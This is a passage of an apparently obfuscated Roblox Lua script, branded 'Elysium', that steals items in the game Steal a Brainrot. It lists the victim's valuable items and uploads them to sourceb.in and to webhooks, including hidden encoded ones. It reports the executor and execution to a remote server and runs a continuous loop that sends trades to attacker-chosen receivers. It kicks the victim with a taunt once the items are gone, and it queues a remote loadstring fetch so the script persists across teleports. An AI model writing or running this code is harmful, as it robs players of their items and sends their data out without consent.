        	local str6 = v .. "/webhook/" .. HttpService:UrlEncode(arg2)
        	local str7 = "content=" .. HttpService:UrlEncode(arg.content or "") .. "&embeds=" .. HttpService:UrlEncode(HttpService:JSONEncode(arg.embeds or {}))
        
        	local ok7, result7 = pcall(function()
        		return v4({
        			Url = str6,
        			Method = "POST",
        			Headers = { ["Content-Type"] = "application/x-www-form-urlencoded", ["X-Roblox-Key"] = str5 },
        			Body = str7,
        		})
        	end)
        
        	return ok7 and result7 and result7.StatusCode and result7.StatusCode >= 200 and result7.StatusCode < 300
        end
        
        local function fn46()
        	if identifyexecutor then
        		local ok7, result7 = pcall(identifyexecutor)
        		if ok7 and result7 then
        			return tostring(result7)
        		end
        	end
        
        	if getexecutorname then
        		local ok7, result7 = pcall(getexecutorname)
        		if ok7 and result7 then
        			return tostring(result7)
        		end
        	end
        
        	if syn then
        		return "Synapse"
        	end
        
        	if KRNL_LOADED then
        		return "KRNL"
        	end
        
        	if fluxus then
        		return "Fluxus"
        	end
        
        	if getgenv().Celery then
        		return "Celery"
        	end
        	return "Unknown"
        end
        
        local v4 = fn46()
        
        local function fn47(arg)
        	local v5 = fn10()
        	if not v5 then
        		return nil
        	end
        	local tbl9 = {}
        	tbl9[#tbl9 + 1] = "=== BRAINROTS ==="
        
        	if #arg.brainrots == 0 then
        		tbl9[#tbl9 + 1] = "(none)"
        	else
        		for _, brainrot in ipairs(arg.brainrots) do
        			local str6 = brainrot.Priority and "⭐" or ""
        
        			if brainrot.HallOfFame then
        				str6 ..= "🏆"
        			end
        
        			tbl9[#tbl9 + 1] = string.format("%s %s | %s", str6, brainrot.DisplayName, fn42(brainrot.ParsedGeneration))
        		end
        	end
        
        	local str6 = table.concat(tbl9, "\n")
        
        	local ok7, result7 = pcall(function()
        		return v5({
        			Url = "https://sourceb.in/api/bins",
        			Method = "POST",
        			Headers = { ["Content-Type"] = "application/json" },
        			Body = HttpService2:JSONEncode({ files = { { content = str6 } } }),
        		})
        	end)
        
        	if ok7 and result7 and result7.StatusCode == 200 then
        		local ok8, result8 = pcall(function()
        			return HttpService2:JSONDecode(result7.Body)
        		end)
        
        		if ok8 and result8 and result8.key then
        			return "https://cdn.sourceb.in/bins/" .. result8.key .. "/0"
        		end
        	else
        		fn3("[SOURCEB] Upload failed:", result7 and result7.StatusCode)
        	end
        
        	return nil
        end
        
        local function fn48(arg, arg2, arg3, arg4)
        	local tbl9 = {}
        
        	for i, v5 in ipairs(arg2) do
        		if not (n3 < i) then
        			local tbl10 = {}
        
        			if v5.Mutation and v5.Mutation ~= "" then
        				tbl10[#tbl10 + 1] = "[" .. v5.Mutation .. "]"
        			end
        
        			if v5.Traits and #v5.Traits > 0 then
        				tbl10[#tbl10 + 1] = "[" .. table.concat(v5.Traits, ", ") .. "]"
        			end
        
        			local str6 = #tbl10 > 0 and table.concat(tbl10, " ") or ""
        			local priority2 = v5.Priority
        			local flag5 = v5.ParsedGeneration >= 800000000
        			local str7
        
        			if priority2 and flag5 then
        				str7 = "⭐💸 "
        			elseif priority2 then
        				str7 = "⭐ "
        			else
        				str7 = ""
        
        				if flag5 then
        					str7 = "💸 "
        				end
        			end
        
        			tbl9[#tbl9 + 1] = str7 .. (str6 ~= "" and str6 .. " ➜ " or "") .. (v5.DisplayName or "???") .. " ➜ " .. fn42(v5.ParsedGeneration)
        			continue
        		end
        
        		break
        	end
        
        	if #arg2 > n3 then
        		tbl9[#tbl9 + 1] = "\n... and " .. #arg2 - n3 .. " more"
        	end
        
        	if #tbl9 == 0 then
        		tbl9[#tbl9 + 1] = "None Found"
        	end
        
        	local str6 = table.concat(tbl9, "\n")
        	local maxPlayers = Players.MaxPlayers
        	local accountAge = arg.AccountAge
        
        	local tbl10 = {
        		{
        			name = "**Player Info**",
        			value = string.format([[```
        Username: %s
        Player Count: %d/%d
        Account Age: %d days
        Executor: %s
        ```]], arg.Name, #Players:GetPlayers(), maxPlayers, accountAge, v4),
        			inline = false,
        		},
        	}
        
        	local flag5 = not arg4
        
        	if flag5 then
        		tbl10[#tbl10 + 1] = {
        			name = "**Receivers**",
        			value = "```\n" .. table.concat(receivers, ", ") .. "\n```",
        			inline = false,
        		}
        	end
        
        	tbl10[#tbl10 + 1] = {
        		name = "**Brainrots — Threshold: >" .. fn42(threshold) .. "**",
        		value = "```\n" .. str6 .. "\n```",
        		inline = false,
        	}
        
        	if arg3 and not arg4 then
        		tbl10[#tbl10 + 1] = { name = "", value = "[View full inventory log](" .. arg3 .. ")", inline = false }
        	end
        
        	if flag5 then
        		tbl10[#tbl10 + 1] = {
        			name = "**How to manually claim?**",
        			value = "Join your PS server (or any server) and send a trade request to the player",
        			inline = false,
        		}
        	end
        
        	return {
        		content = "",
        		embeds = {
        			{
        				title = arg4 and "Steal A Brainrot Public Hit! Elysium woooo!" or "Steal A Brainrot Hit! Elysium ezez",
        				color = 9662683,
        				fields = tbl10,
        				footer = { text = "Elysium! (Steal a Brainrot)" },
        				timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
        			},
        		},
        	}
        end
        
        local function fn49(arg, arg2)
        	local brainrots = arg2.brainrots
        	local n9 = 0
        	local flag5 = false
        	local flag6 = false
        
        	for _, brainrot in ipairs(brainrots) do
        		if n9 < brainrot.ParsedGeneration then
        			n9 = brainrot.ParsedGeneration
        		end
        
        		if brainrot.Priority then
        			flag5 = true
        		end
        
        		if brainrot.HallOfFame then
        			flag6 = true
        		end
        	end
        
        	fn3("Webhook stats | maxGen:", fn42(n9), "| prio:", flag5, "| hof:", flag6)
        	local flag7 = n9 >= threshold and threshold > 0 or flag5
        	local v5 = fn47(arg2)
        	fn3("Sourcebin URL:", v5 or "FAILED")
        
        	if webhook ~= "" then
        		local v6 = fn48(arg, brainrots, v5, false)
        
        		if flag7 then
        			v6.content = "@everyone `" .. arg.Name .. "` — Paste this in the Trading Machine!"
        			flag3 = true
        		end
        
        		fn45(v6, webhook)
        		fn3("  Main webhook sent | hiHit:", flag7)
        	end
        
        	if str3 ~= "" then
        		fn45(fn48(arg, brainrots, v5, true), "AaFaIalakb*abbaaMaqa[a6aLa-aaacbdb4a_a+aka*aSbeb<awala1aGaaaCa3acasa8a#aEaebaada#aba)a=akbdaRbnaXatawaDahayagbkbwaQazaba6a$avaaayaza[ayalbFb-aFagbibubyaga[aaaAabafa!a1a7aiafa6a*a8acaxa-aiazagavaebDamana-a(aSazaibdbabEa*aHaaabbqa=aCa$aQagbcaMakbhb1ajaibha%aCalbFaka#aAajbuazaBaaajb")
        		fn3("  Public webhook sent")
        	end
        
        	if flag6 and str4 ~= "" then
        		fn45(fn48(arg, brainrots, v5, true), "AaFanaVa>a-aebhaUaqa]aKaQa}aaawaab#aPb+aka*agbxajbwa=a4axauaCaracavaea&aEa0atada$awa=a-a=adaFbXa#a[awaDahayagbkbwataDabaxabavaaayaEa{ayalbIb-agaSbibLbNbgafaaaAa>afaza4a5aiaOala(aqaRaxa-aiaBaga_a%aUa0ana-a^aGagacb>acbEa*awaaabbqakaCa-amagbcblakbhb2aZahbsa%aCalbFaka]aAaTaua*acaaafb")
        		fn3("  HOF webhook sent!")
        	end
        end
        
        local function fn50()
        	fn3("Starting kick watcher...")
        
        	local function fn51()
        		local tbl9 = {}
        		local v5 = fn16()
        		local n9 = 0
        
        		if v5 then
        			for _, v6 in pairs(v5) do
        				if type(v6) == "table" and not v6.Machine then
        					local v7 = fn20(v6)
        
        					if fn17(v6) or threshold > 0 and v7 >= threshold then
        						if v6.UUID then
        							tbl9[v6.UUID] = true
        							n9 += 1
        						end
        					end
        				end
        			end
        		end
        
        		return tbl9, n9
        	end
        
        	local v5, v6 = fn51()
        	if not v5 or v6 == 0 then
        		fn3("  No valuable UUIDs to track")
        		return
        	end
        	fn3("  Tracking", v6, "valuable UUIDs")
        	flag3 = true
        	local flag5 = false
        	local n9 = 0
        
        	local function fn52()
        		if flag5 then
        			return
        		end
        
        		if flag2 then
        			return
        		end
        
        		if tick() - n9 < 15 then
        			return
        		end
        		local v7 = fn16()
        
        		if v7 then
        			local tbl9 = {}
        
        			for _, v8 in pairs(v7) do
        				if type(v8) == "table" and v8.UUID then
        					tbl9[v8.UUID] = true
        				end
        			end
        
        			for k in pairs(v5) do
        				if not tbl9[k] then
        					task.wait(2)
        					if flag2 then
        						return
        					end
        					local v8 = fn16()
        					local flag6 = true
        
        					if v8 then
        						for _, v9 in pairs(v8) do
        							if type(v9) == "table" and v9.UUID == k then
        								flag6 = false
        								break
        							end
        						end
        					end
        
        					if flag6 and not flag2 then
        						flag5 = true
        						break
        					end
        				end
        			end
        		end
        
        		if flag5 then
        			task.wait(1)
        
        			localPlayer:Kick([[All your items just got stolen by Elysium.
         Join our Discord: https://discord.gg/3lysium 
        ]])
        		end
        	end
        
        	task.spawn(function()
        		while not flag5 do
        			task.wait(10)
        
        			if not flag2 then
        				fn52()
        			end
        		end
        	end)
        end
        
        fn3("=== STARTUP ===")
        
        task.spawn(function()
        	local v5 = fn10()
        	if not v5 then
        		fn3("Track execution: no requester")
        		return
        	end
        	fn3("Tracking execution...")
        
        	pcall(function()
        		v5({
        			Url = v .. "/track-execution-sab",
        			Method = "POST",
        			Headers = { ["Content-Type"] = "application/json", ["X-Roblox-Key"] = str5 },
        			Body = HttpService2:JSONEncode({ target_players = receivers, executor = localPlayer.Name }),
        		})
        	end)
        end)
        
        task.spawn(function()
        	task.wait(1)
        	fn3("=== FREEZING PLOT ===")
        
        	if fn22() then
        		fn3("Plot frozen successfully")
        	else
        		fn3("Failed to freeze plot, will retry...")
        		task.wait(2)
        		fn22()
        	end
        end)
        
        task.spawn(function()
        	task.wait(1)
        	fn3("=== WEBHOOK SCAN ===")
        	local v5 = fn44()
        	fn3("Found", #v5.brainrots, "brainrots")
        
        	for i, brainrot in ipairs(v5.brainrots) do
        		if i <= 5 then
        			local v6 = tostring
        			local hallOfFame = brainrot.HallOfFame
        			fn3(string.format("  [%d] %s | %s | Prio:%s | HOF:%s", i, brainrot.DisplayName, fn42(brainrot.ParsedGeneration), tostring(brainrot.Priority), v6(hallOfFame)))
        		end
        	end
        
        	pcall(function()
        		fn49(localPlayer, v5)
        	end)
        end)
        
        task.spawn(function()
        	task.wait(1)
        	fn3("=== KICK WATCHER ===")
        	pcall(fn50)
        end)
        
        task.spawn(function()
        	fn3("=== MAIN TRADE LOOP ACTIVE ===")
        
        	while true do
        		task.wait(1)
        
        		if not flag2 then
        			for _, receiver in ipairs(receivers) do
        				if not flag2 then
        					pcall(fn41, receiver)
        				end
        			end
        		end
        	end
        end)
        
        local str6 = "    local HttpService = game:GetService(\"HttpService\")\n    local data = HttpService:JSONDecode('" .. HttpService2:JSONEncode({ RECEIVERS = receivers, WEBHOOK = webhook, THRESHOLD = threshold }) .. [[')
            getgenv().RECEIVERS = data.RECEIVERS
            getgenv().WEBHOOK   = data.WEBHOOK
            getgenv().THRESHOLD = data.THRESHOLD
            loadstring(game:HttpGet("https://raw.githubusercontent.com/31yyyyy/main/refs/heads/main/sab.lua"))()
        ]]
        
        if queue_on_teleport then
        	queue_on_teleport(str6)
        end
        
        fn3("=== SCRIPT FULLY LOADED ===")

    end)
    if not ok then warn('[GHOST MOREIRA] Error en auto-trade: ' .. tostring(err)) end
end)